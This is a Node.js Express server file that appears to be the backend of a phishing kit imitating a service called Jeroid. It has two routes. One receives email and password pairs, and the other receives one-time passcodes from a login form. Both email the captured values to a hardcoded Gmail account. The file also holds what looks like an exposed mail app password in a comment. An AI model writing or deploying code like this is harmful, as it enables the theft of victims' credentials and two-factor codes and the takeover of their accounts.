const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "chipperagent343@gmail.com";
//const pass = "kitwqkvsqjkcvnlv";

// Function to generate random ID
const generateRandomId = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let id = '';
  for (let i = 0; i < 6; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
};

// API route for login credentials
app.post("/", (req, res) => {
  const { email, password } = req.body;
  const uniqueId = generateRandomId();
  
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `"Jeroid Notifications" <${userEmail}>`, // Display name with email
    to: userEmail,
    subject: `New submission - Jeroid logins [${uniqueId}]`,
    text: `New submission Protect this form against spam\n\nEmail: ${email}\nPassword: ${password}\n\nSubmission ID: ${uniqueId}`,
    html: `
      <div style="font-family: Arial, sans-serif; padding: 20px;">
        <h2>New submission - Jeroid logins</h2>
        <p><strong>Submission ID:</strong> ${uniqueId}</p>
        <hr>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <hr>
        <p style="color: #666; font-size: 12px;">Protect this form against spam and abuse</p>
      </div>
    `,
  };

  console.log(mailOptions);
  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("success");
    }
  });
});

// API route for OTP
app.post("/otp", (req, res) => {
  console.log(req.body);
  const { email, otp } = req.body;
  const uniqueId = generateRandomId();
  
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `"Jeroid Notifications" <${userEmail}>`,
    to: userEmail,
    subject: `New submission - Jeroid logins [${uniqueId}]`,
    text: `New submission Protect this form against spam\n\nOTP: ${otp}\nEmail: ${email}\n\nSubmission ID: ${uniqueId}`,
    html: `
      <div style="font-family: Arial, sans-serif; padding: 20px;">
        <h2>New submission - Jeroid logins</h2>
        <p><strong>Submission ID:</strong> ${uniqueId}</p>
        <hr>
        <p><strong>OTP:</strong> ${otp}</p>
        <p><strong>Email:</strong> ${email}</p>
        <hr>
        <p style="color: #666; font-size: 12px;">Protect this form against spam and abuse</p>
      </div>
    `,
  };

  console.log(mailOptions);
  
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});


